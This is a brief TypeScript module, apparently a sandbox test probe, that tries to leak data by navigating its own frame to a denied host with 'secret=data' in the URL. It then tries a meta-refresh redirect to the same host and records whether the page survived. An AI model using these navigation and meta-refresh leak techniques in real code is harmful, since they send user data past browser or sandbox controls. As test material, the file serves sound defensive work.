// UI module that tries to navigate its own frame, e.g. to leak data in the URL
import type { EvilConfig } from "./probes";

export default function (target: HTMLElement): () => void {
  mustang.storage.get("config").then(json => {
    let config = json as unknown as EvilConfig;
    let marker = document.createElement("div");
    marker.id = "still-here";
    target.appendChild(marker);
    location.href = `${config.denied}/frame-${config.tag}/navigated?secret=data`;
    setTimeout(() => {
      let meta = document.createElement("meta");
      meta.httpEquiv = "refresh";
      meta.content = `0; url=${config.denied}/frame-${config.tag}/metaRefresh`;
      document.head.appendChild(meta);
    }, 500);
    setTimeout(() => mustang.storage.set("results:navigate-" + config.tag, document.getElementById("still-here") ? "still here" : "gone"), 1500);
  });
  return () => {};
}
